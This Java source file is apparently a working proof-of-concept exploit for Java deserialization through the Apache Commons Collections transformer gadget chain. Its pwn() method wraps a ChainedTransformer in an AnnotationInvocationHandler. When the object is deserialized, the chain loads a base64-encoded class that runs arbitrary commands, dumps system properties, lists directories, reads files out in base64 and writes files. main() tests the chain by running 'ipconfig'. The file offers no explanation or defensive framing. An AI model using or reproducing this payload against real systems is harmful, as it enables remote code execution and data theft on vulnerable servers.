package com.java.desr;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import sun.misc.BASE64Decoder;

import sun.org.mozilla.javascript.internal.DefiningClassLoader;

public class Test {
	
	public static Object pwn(String execArgs) throws Exception {
		
		String R = "yv66vgAAADIBMAcAAgEAAVIHAAQBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWAQAEQ29kZQoAAwAJDAAFAAYBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFI7AQAEZXhlYwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACkV4Y2VwdGlvbnMHABIBABNqYXZhL2xhbmcvRXhjZXB0aW9uCAAUAQAABwAWAQAbamF2YS9pby9CdWZmZXJlZElucHV0U3RyZWFtCgAYABoHABkBABFqYXZhL2xhbmcvUnVudGltZQwAGwAcAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwoAGAAeDAAOAB8BACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsKACEAIwcAIgEAEWphdmEvbGFuZy9Qcm9jZXNzDAAkACUBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07CgAVACcMAAUAKAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgcAKgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyCgAsAC4HAC0BABBqYXZhL2xhbmcvU3RyaW5nDAAvADABAAd2YWx1ZU9mAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsKACkAMgwABQAPCgAsADQMAAUANQEAByhbQklJKVYKACkANwwAOAA5AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7CgApADsMADwAPQEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsKABUAPwwAQABBAQAEcmVhZAEAByhbQklJKUkKABUAQwwARAAGAQAFY2xvc2UIAEYBAANeXl4KABEAMgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAXMBAAJiZgEAAltCAQADbGVuAQABSQEAA2JpcwEAHUxqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW07AQANU3RhY2tNYXBUYWJsZQcATAEABGluZm8KAFUAVwcAVgEAEGphdmEvbGFuZy9UaHJlYWQMAFgAWQEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwoAVQBbDABcAF0BABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7CgBfAGEHAGABABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMAGIAYwEAC2dldFJlc291cmNlAQAiKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uZXQvVVJMOwoAZQBnBwBmAQAMamF2YS9uZXQvVVJMDABoAD0BAAdnZXRQYXRoCABqAQAFVVRGLTgKAGwAbgcAbQEAE2phdmEvbmV0L1VSTERlY29kZXIMAG8AcAEABmRlY29kZQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7CAByAQAHV0VCLUlORgoALAB0DAB1AHYBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJCgAsAHgMAHkAegEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsIAHwBAAVlcnJvcggAfgEACVdlYlJvb3Q6IAgAgAEAAQoIAIIBAAlqYXZhLmhvbWUIAIQBAAdvcy5uYW1lCACGAQAHb3MuYXJjaAgAiAEACm9zLnZlcnNpb24IAIoBAAl1c2VyLm5hbWUIAIwBAAl1c2VyLmhvbWUIAI4BAAh1c2VyLmRpcggAkAEAEmphdmEuY2xhc3MudmVyc2lvbggAkgEAD2phdmEuY2xhc3MucGF0aAgAlAEAEWphdmEubGlicmFyeS5wYXRoCACWAQAOZmlsZS5zZXBhcmF0b3IIAJgBAA5wYXRoLnNlcGFyYXRvcggAmgEAC2phdmEudmVuZG9yCACcAQAPamF2YS52ZW5kb3IudXJsCACeAQAdamF2YS52bS5zcGVjaWZpY2F0aW9uLnZlcnNpb24IAKABABxqYXZhLnZtLnNwZWNpZmljYXRpb24udmVuZG9yCACiAQAaamF2YS52bS5zcGVjaWZpY2F0aW9uLm5hbWUIAKQBAA9qYXZhLnZtLnZlcnNpb24IAKYBAAxqYXZhLnZtLm5hbWUIAKgBABpqYXZhLnNwZWNpZmljYXRpb24udmVyc2lvbggAqgEAAjogCgCsAK4HAK0BABBqYXZhL2xhbmcvU3lzdGVtDACvALABAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEcGF0aAEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJ3cgEAA3N0cgEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAFpBwC2AQAJd3JpdGVyb290AQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWBwC8AQASamF2YS9pby9GaWxlV3JpdGVyCAC+AQABLwoAuwAyBwDBAQAWamF2YS9pby9CdWZmZXJlZFdyaXRlcgoAwADDDAAFAMQBABMoTGphdmEvaW8vV3JpdGVyOylWCgDAAMYMAMcADwEABXdyaXRlCgDAAEMIAMoBAAteXl5CSU5HT15eXgEACGZpbGVuYW1lAQAEbGluZQEAAWYBABRMamF2YS9pby9GaWxlV3JpdGVyOwEAAmZ3AQAYTGphdmEvaW8vQnVmZmVyZWRXcml0ZXI7AQAFbGlzdFIKANMA1QcA1AEADGphdmEvaW8vRmlsZQwA1gDXAQAJbGlzdFJvb3RzAQARKClbTGphdmEvaW8vRmlsZTsKANMAOwgA2gEAAVwKACwA3AwA3QDeAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7CADgAQABCQEAA3RtcAEAD1tMamF2YS9pby9GaWxlOwcA4gEABWxpc3RGAQAGKFtJSSlWCgDTAOcMAOgA1wEACWxpc3RGaWxlcwoA0wDqDADrAOwBAAtpc0RpcmVjdG9yeQEAAygpWggA7gEABGRpcgkKANMA8AwA8QA9AQAHZ2V0TmFtZQcA8wEAFnN1bi9taXNjL0JBU0U2NEVuY29kZXIKAPIACQcA9gEAF2phdmEvaW8vRGF0YUlucHV0U3RyZWFtBwD4AQAXamF2YS9pby9GaWxlSW5wdXRTdHJlYW0KAPcA+gwABQD7AQARKExqYXZhL2lvL0ZpbGU7KVYKAPUAJwcA/gEAHWphdmEv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";
		BASE64Decoder decoder = new BASE64Decoder();
		byte[] bt = decoder.decodeBuffer(R);
		
		final Transformer[] transforms = new Transformer[] {
				new ConstantTransformer(DefiningClassLoader.class),
				//new ConstantTransformer(ClassLoader.class),
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[0] }),
				new InvokerTransformer(
						"newInstance",
						new Class[] { Object[].class },
						new Object[] { new Object[0] }),
				new InvokerTransformer("defineClass",
						new Class[] { String.class, byte[].class }, new Object[] { "R", bt }),
				new InvokerTransformer(
						"newInstance",
						new Class[] {},
						new Object[] {}),
				new InvokerTransformer("exec",
						new Class[] {String.class},
						new Object[] {execArgs}),new ConstantTransformer(1)
		};		

		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);

		Class cls = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(Retention.class, outmap);
		return instance;
	}
	
	public static byte[] des_check(Object mi) throws Exception
	{
		ByteArrayOutputStream out = new ByteArrayOutputStream();
		ObjectOutputStream os = new ObjectOutputStream(out);
		os.writeObject(mi);
		os.close();

		byte[] bt = out.toByteArray();

		ByteArrayInputStream in = new ByteArrayInputStream(bt);
		ObjectInputStream ois = new ObjectInputStream(in);
		ois.readObject();
		ois.close();

		return bt;
	}
	
	public static void main(String[] args) throws Exception {
		
		des_check(pwn("ipconfig"));

	}
}